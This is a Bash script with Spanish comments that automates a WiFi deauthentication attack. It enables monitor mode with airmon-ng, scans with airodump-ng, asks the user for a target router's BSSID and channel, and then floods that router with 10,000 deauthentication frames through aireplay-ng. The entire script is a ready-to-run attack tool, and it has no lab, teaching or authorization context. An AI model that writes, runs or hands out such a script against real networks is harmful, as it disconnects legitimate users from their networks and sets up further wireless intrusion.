#!/bin/bash

echo "=== Script de Desconexión WiFi (Deauth) ==="

# Paso 1: Mostrar interfaces WiFi disponibles
echo ""
echo "[+] Detectando interfaces WiFi..."
iw dev | grep Interface | awk '{print $2}'
echo ""
read -p "[?] Ingresa el nombre de la interfaz que quieres usar (ej. wlan0): " IFACE

# Paso 2: Activar modo monitor
echo "[+] Activando modo monitor..."
sudo airmon-ng start $IFACE

# Obtener el nombre de la interfaz en modo monitor
MON_IFACE="${IFACE}mon"
echo "[+] Interfaz en modo monitor: $MON_IFACE"

# Paso 3: Escanear redes WiFi
echo "[+] Escaneando redes WiFi... Presiona Ctrl+C cuando veas la red que quieres."
sleep 2
sudo airodump-ng $MON_IFACE

# Paso 4: Pedir datos de la red objetivo
read -p "[?] Ingresa el BSSID del router objetivo: " BSSID
read -p "[?] Ingresa el canal (CH) del router objetivo: " CHANNEL

# Paso 5: Fijar canal de la interfaz
echo "[+] Configurando canal $CHANNEL en la interfaz $MON_IFACE..."
sudo iwconfig $MON_IFACE channel $CHANNEL

# Paso 6: Ataque de deautenticación
echo "[+] Iniciando ataque de deautenticación..."
sudo aireplay-ng --deauth 10000 -a $BSSID $MON_IFACE
